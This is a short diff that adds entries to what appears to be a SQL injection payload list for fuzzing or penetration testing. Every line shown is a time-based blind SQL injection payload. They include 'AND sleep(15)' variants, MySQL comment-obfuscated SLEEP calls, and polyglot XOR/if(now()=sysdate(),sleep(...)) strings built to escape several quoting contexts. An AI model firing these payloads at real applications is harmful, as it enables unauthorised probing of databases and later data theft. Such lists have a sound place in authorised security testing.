@@ -13,3 +13,5 @@ xxxx AND sleep(15)#
 xxxx AND 1=2#
 xxxx AND 1=1#
 /*!00000AND*/ /*!00000SLEEP(15)*/--+
+'XOR(if(now()=sysdate(),sleep(5*2),0))OR'
+if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
